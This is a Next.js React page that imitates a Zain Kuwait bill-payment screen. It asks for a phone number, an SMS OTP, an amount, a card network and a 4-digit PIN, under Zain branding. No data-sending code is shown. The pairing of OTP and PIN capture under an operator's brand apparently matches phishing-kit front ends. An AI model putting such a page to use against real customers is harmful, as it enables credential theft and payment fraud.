"use client"

import { useState, useRef } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import Link from "next/link"
import { Suspense } from "react"

function BillContent() {
  const searchParams = useSearchParams()
  const phone = searchParams.get("phone") || "XXXXXXXX"
  
  // OTP State
  const [otp, setOtp] = useState(["", "", "", ""])
  const otpRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)]
  
  // Amount State
  const [selectedAmount, setSelectedAmount] = useState<"full" | "custom" | "minimum">("full")
  const [customAmount, setCustomAmount] = useState("")
  
  // Payment Method State
  const [selectedPayment, setSelectedPayment] = useState<"visa" | "mastercard" | "knet">("knet")
  
  // Verification Code State
  const [verificationCode, setVerificationCode] = useState(["", "", "", ""])
  const verificationRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)]
  
  const fullAmount = 12.500
  const minimumAmount = 5.000
  
  const getPayAmount = () => {
    switch (selectedAmount) {
      case "full":
        return fullAmount.toFixed(3)
      case "minimum":
        return minimumAmount.toFixed(3)
      case "custom":
        return customAmount || "0.000"
    }
  }

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return
    const newOtp = [...otp]
    newOtp[index] = value
    setOtp(newOtp)
    if (value && index < 3) {
      otpRefs[index + 1].current?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpRefs[index - 1].current?.focus()
    }
  }

  const handleVerificationChange = (index: number, value: string) => {
    if (value.length > 1) return
    const newCode = [...verificationCode]
    newCode[index] = value
    setVerificationCode(newCode)
    if (value && index < 3) {
      verificationRefs[index + 1].current?.focus()
    }
  }

  const handleVerificationKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !verificationCode[index] && index > 0) {
      verificationRefs[index - 1].current?.focus()
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0a14] flex flex-col">
      {/* Header */}
      <header className="py-5 px-5 sticky top-0 bg-[#0a0a14]/95 backdrop-blur-sm z-10">
        <div className="max-w-md mx-auto flex items-center justify-between">
          <Link href="/pay" className="w-11 h-11 rounded-full bg-[#16162a] flex items-center justify-center border border-[#252545] active:scale-95 transition-transform">
            <svg className="w-5 h-5 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7"/>
            </svg>
          </Link>
          <div className="flex-1 flex justify-center">
            <Image
              src="/zain-logo.svg"
              alt="Zain"
              width={70}
              height={28}
              className="h-7 w-auto"
            />
          </div>
          <div className="w-11" />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 px-5 pb-8 overflow-y-auto">
        <div className="w-full max-w-sm mx-auto">
          
          {/* Phone Number Display */}
          <div className="text-center mb-8 pt-2">
            <p className="text-gray-500 text-sm mb-1">Mobile Number</p>
            <p className="text-white text-xl font-semibold tracking-wide">+965 {phone}</p>
          </div>

          {/* 1. OTP Code - 4 Digits */}
          <div className="mb-10">
            <div className="flex items-center justify-center gap-2 mb-2">
              <div className="w-8 h-8 rounded-full bg-gradient-to-r from-[#7c3aed] to-[#a855f7] flex items-center justify-center text-white text-sm font-bold">1</div>
              <p className="text-white font-semibold text-[17px]">Enter OTP Code</p>
            </div>
            <p className="text-gray-500 text-center text-sm mb-5">We sent a 4-digit code to your mobile</p>
            <div className="flex justify-center gap-4" dir="ltr">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={otpRefs[index]}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value.replace(/[^0-9]/g, ""))}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className="w-16 h-16 bg-[#16162a] border-2 border-[#252545] rounded-2xl text-white text-2xl text-center font-semibold focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500/30 transition-all"
                />
              ))}
            </div>
            <button className="w-full text-purple-400 text-sm mt-5 hover:text-purple-300 transition-colors font-medium">
              Resend Code
            </button>
          </div>

          {/* Divider */}
          <div className="h-px bg-gradient-to-r from-transparent via-[#252545] to-transparent mb-10" />

          {/* 2. Amount Selection */}
          <div className="mb-10">
            <div className="flex items-center justify-center gap-2 mb-5">
              <div className="w-8 h-8 rounded-full bg-gradient-to-r from-[#7c3aed] to-[#a855f7] flex items-center justify-center text-white text-sm font-bold">2</div>
              <p className="text-white font-semibold text-[17px]">Select Amount</p>
            </div>
            
            {/* Full Amount */}
            <button
              onClick={() => setSelectedAmount("full")}
              className={`w-full flex items-center justify-between p-5 rounded-2xl mb-3 border-2 transition-all ${
                selectedAmount === "full" 
                  ? "bg-purple-600/15 border-purple-500" 
                  : "bg-[#16162a] border-[#252545]"
              }`}
            >
              <div className="flex items-center gap-4">
                <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${
                  selectedAmount === "full" ? "border-purple-500" : "border-gray-600"
                }`}>
                  {selectedAmount === "full" && (
                    <div className="w-3 h-3 rounded-full bg-purple-500" />
                  )}
                </div>
                <span className="text-white font-medium text-[15px]">Full Amount</span>
              </div>
              <span className="text-white font-bold text-[15px]">{fullAmount.toFixed(3)} KWD</span>
            </button>

            {/* Custom Amount */}
            <button
              onClick={() => setSelectedAmount("custom")}
              className={`w-full p-5 rounded-2xl mb-3 border-2 transition-all text-left ${
                selectedAmount === "custom" 
                  ? "bg-purple-600/15 border-purple-500" 
                  : "bg-[#16162a] border-[#252545]"
              }`}
            >
              <div className="flex items-center gap-4">
                <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${
                  selectedAmount === "custom" ? "border-purple-500" : "border-gray-600"
                }`}>
                  {selectedAmount === "custom" && (
                    <div className="w-3 h-3 rounded-full bg-purple-500" />
                  )}
                </div>
                <span className="text-white font-medium text-[15px]">Custom Amount</span>
              </div>
              {selectedAmount === "custom" && (
                <div className="mt-4 ml-10">
                  <input
                    type="number"
                    value={customAmount}
                    onChange={(e) => setCustomAmount(e.target.value)}
                    placeholder="Enter amount in KWD"
                    className="w-full bg-[#0a0a14] text-white rounded-xl px-4 py-3.5 text-left placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500/50 border border-[#252545] text-[15px]"
                    onClick={(e) => e.stopPropagation()}
                  />
                </div>
              )}
            </button>

            {/* Minimum Amount */}
            <button
              onClick={() => setSelectedAmount("minimum")}
              className={`w-full flex items-center justify-between p-5 rounded-2xl border-2 transition-all ${
                selectedAmount === "minimum" 
                  ? "bg-purple-600/15 border-purple-500" 
                  : "bg-[#16162a] border-[#252545]"
              }`}
            >
              <div className="flex items-center gap-4">
                <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${
                  selectedAmount === "minimum" ? "border-purple-500" : "border-gray-600"
                }`}>
                  {selectedAmount === "minimum" && (
                    <div className="w-3 h-3 rounded-full bg-purple-500" />
                  )}
                </div>
                <span className="text-white font-medium text-[15px]">Minimum Amount</span>
              </div>
              <span className="text-white font-bold text-[15px]">{minimumAmount.toFixed(3)} KWD</span>
            </button>

            {/* Amount to Pay Display */}
            <div className="bg-[#16162a] rounded-2xl p-5 border border-[#252545] mt-5">
              <div className="flex justify-between items-center">
                <span className="text-gray-400 text-[15px]">Amount to Pay</span>
                <span className="text-white text-2xl font-bold">{getPayAmount()} KWD</span>
              </div>
            </div>
          </div>

          {/* Divider */}
          <div className="h-px bg-gradient-to-r from-transparent via-[#252545] to-transparent mb-10" />

          {/* 3. Payment Methods - KNET */}
          <div className="mb-10">
            <div className="flex items-center justify-center gap-2 mb-5">
              <div className="w-8 h-8 rounded-full bg-gradient-to-r from-[#7c3aed] to-[#a855f7] flex items-center justify-center text-white text-sm font-bold">3</div>
              <p className="text-white font-semibold text-[17px]">Payment Method</p>
            </div>
            <div className="flex justify-center gap-4">
              <button 
                onClick={() => setSelectedPayment("knet")}
                className={`rounded-2xl px-6 py-4 flex items-center justify-center min-w-[90px] transition-all border-2 ${
                  selectedPayment === "knet" 
                    ? "bg-[#003d7a] border-purple-500 ring-2 ring-purple-500/30" 
                    : "bg-[#004d99] border-transparent"
                }`}
              >
                <span className="text-white font-bold text-lg tracking-wide">KNET</span>
              </button>
              <button 
                onClick={() => setSelectedPayment("visa")}
                className={`rounded-2xl px-5 py-4 flex items-center justify-center min-w-[90px] transition-all border-2 ${
                  selectedPayment === "visa" 
                    ? "bg-white border-purple-500 ring-2 ring-purple-500/30" 
                    : "bg-white/95 border-transparent"
                }`}
              >
                <Image 
                  src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" 
                  alt="Visa" 
                  width={55} 
                  height={32}
                  className="h-7 w-auto"
                />
              </button>
              <button 
                onClick={() => setSelectedPayment("mastercard")}
                className={`rounded-2xl px-5 py-4 flex items-center justify-center min-w-[90px] transition-all border-2 ${
                  selectedPayment === "mastercard" 
                    ? "bg-white border-purple-500 ring-2 ring-purple-500/30" 
                    : "bg-white/95 border-transparent"
                }`}
              >
                <Image 
                  src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
                  alt="Mastercard" 
                  width={55} 
                  height={32}
                  className="h-7 w-auto"
                />
              </button>
            </div>
          </div>

          {/* Divider */}
          <div className="h-px bg-gradient-to-r from-transparent via-[#252545] to-transparent mb-10" />

          {/* 4. Verification Code / PIN */}
          <div className="mb-10">
            <div className="flex items-center justify-center gap-2 mb-2">
              <div className="w-8 h-8 rounded-full bg-gradient-to-r from-[#7c3aed] to-[#a855f7] flex items-center justify-center text-white text-sm font-bold">4</div>
              <p className="text-white font-semibold text-[17px]">Verification Code</p>
            </div>
            <p className="text-gray-500 text-center text-sm mb-5">Enter your 4-digit PIN</p>
            <div className="flex justify-center gap-4" dir="ltr">
              {verificationCode.map((digit, index) => (
                <input
                  key={index}
                  ref={verificationRefs[index]}
                  type="password"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleVerificationChange(index, e.target.value.replace(/[^0-9]/g, ""))}
                  onKeyDown={(e) => handleVerificationKeyDown(index, e)}
                  className="w-16 h-16 bg-[#16162a] border-2 border-[#252545] rounded-2xl text-white text-2xl text-center font-semibold focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500/30 transition-all"
                />
              ))}
            </div>
          </div>

          {/* Pay Button */}
          <button className="w-full bg-gradient-to-r from-[#7c3aed] to-[#a855f7] text-white font-semibold py-5 rounded-full text-[17px] hover:opacity-95 transition-all active:scale-[0.99] shadow-xl shadow-purple-900/40">
            Pay {getPayAmount()} KWD
          </button>

        </div>
      </main>

      {/* Footer */}
      <footer className="py-5 px-5">
        <div className="max-w-md mx-auto">
          <p className="text-gray-700 text-xs text-center tracking-wide">
            Copyright 2024 Zain Group, all rights reserved
          </p>
        </div>
      </footer>
    </div>
  )
}

export default function BillPage() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-[#0a0a14] flex items-center justify-center"><div className="text-white">Loading...</div></div>}>
      <BillContent />
    </Suspense>
  )
}
